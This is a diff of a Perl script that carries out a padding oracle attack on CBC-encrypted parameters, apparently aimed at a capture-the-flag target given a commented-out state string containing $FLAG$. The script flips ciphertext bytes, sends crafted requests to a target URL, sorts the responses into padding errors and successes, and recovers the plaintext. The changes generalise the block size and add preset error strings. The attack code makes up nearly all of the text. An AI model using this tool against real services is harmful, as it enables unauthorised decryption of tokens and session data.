@@ -44,46 +44,40 @@ my $tempPARM = $parm;
 my $it = 6;
 my $currentB = $qLen-($bSize+$it);
 
-substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
-my $return = getRequest($tempPARM);
-my $limit = 0;
-if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = 17;} # edit this to reflect changes of the #bSize variable (amoung others)
+# Add a way to allow users to preemptively add to the arrays
+push @paddingErrors, "PaddingException", "bad";
+push @guuud, "UnicodeDecodeError", "msg";
+#
 
+# Padding length
+my $tempPARM = $parm; my $it = 6; my $currentB = $qLen-($bSize+$it);
+substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
+my $return = getRequest($tempPARM); my $limit = 0;
+if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = $bSize+1;} # Make sure this works with other block sizes
 while ($it < $limit){
     $tempPARM = $parm;
     $currentB = $qLen-($bSize+$it);
-
     substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
     $return = getRequest($tempPARM);
     if ($return == 1){ # Test  if using a ($return) statment works
-        if ($it == 0){
-            $AIM = 0;
-        }else{
-            $tempPARM = $parm;
-            $it--;
-            $currentB = $qLen-($bSize+$it);
+        if ($it == 0){ $AIM = 0; }
+        else{ 
+            $tempPARM = $parm; $it--; $currentB = $qLen-($bSize+$it);
             substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
             $return = getRequest($tempPARM);
-            if ($return == 1){
-                $AIM = $it; #Maybe do some inital arithmetic here
-            }else{
-                $AIM = $it+1; #Maybe do some inital arithmetic here
-            }
-        }
+            if ($return == 1){ $AIM = $it; }
+            else{ $AIM = $it+1; }}
         last;
-    }else{
-        $it = $it + 2;
-    }
-}
-if ($it == 18){
-    $AIM = 16; #Maybe do some inital arithmetic here
-}
+    }else{ $it = $it + 2; }}
+
+if ($it == $bSize+2){ $AIM = $bSize; }
 
 my $ill = 0;
 while ($ill < $AIM){
     push @text, $AIM;
     $ill++;
 }
+# $AIM equals the amount of padding
 #
 
 #my $state = 'state=324b26c2eeeb51c3191d212e44ab4670083$FLAG$", "id": "2", "key": "yrIoJt1shYp3XUP87-9eRA~~"}';
@@ -98,6 +92,7 @@ my $target = 0;
 my $bNum = ($qLen+1)/$bSize;
 print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
 my $bt = 0;
+
 while ($bt < $bNum){
     $target = $AIM+1;
     $it = $AIM;
@@ -133,17 +128,15 @@ printPlain();
 
 # End -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-sub prep { # Prep paddings (turns something like \x03\x03\x03 to \x04\x04\x04)
+sub prep { # Preps padding for bit flipping (turns padding from something like \x03\x03\x03 to \x04\x04\x04)
     my $tilAIM = 0;
     while ($tilAIM < $AIM){
         $currentB = $qLen-($bSize+$tilAIM);
         substr($tempPARM, $currentB, 1) = chr(ord(substr($parm, $currentB, 1))^$target^$text[$tilAIM+$bt*$bSize]);
-        $tilAIM++;
-    }
-}
+        $tilAIM++; }}
 
-sub getRequest {
-    #my $heel = uri_escape(encode_base64($_[0], ''));
+
+sub getRequest { # Send a get request and classify the response
     my $heel = encode_base64($_[0], '');
     if ( $URLEncoding == 1 ){ $heel = uri_escape($heel); }
     elsif ( $URLEncoding == 2) { $heel =~ s/\+/-/ig; $heel =~ s/\//!/ig; $heel =~ s/=/~/ig; }
@@ -153,9 +146,7 @@ sub getRequest {
         return 0;
     }elsif( grep {$response->{content} =~ $_ } @guuud ){
         return 1;
-    }else{
-        my $uinput;
-        while(1){
+    }else{ my $uinput; while(1){
             print "\n$url$heel\n\n1 = Padding Error\n2 = Other\n3 = Similar to previous\nEnter your choice: ";
             chomp ($uinput = <STDIN>);
             $uinput = $uinput+0; # Make this better
@@ -169,7 +160,9 @@ sub getRequest {
                 chomp (my $tempV = <STDIN>);
                 push @paddingErrors, $tempV;
                 return 0;
-sub printPlain {
+            }else{ print "\nPlease input either \"1\",  \"2\", or \"3\" (You typed: $uinput)\n\n"; next; }}}}
+
+sub printPlain { # Print plain text as acsii and hex (more encodings and options to be added)
     my @plainText = reverse(@text);
     foreach( @plainText ){ # temp fix for newlines
     if (chr($_) eq "\n"){ print '\n'; }else{ printf("%s", chr($_)); }}
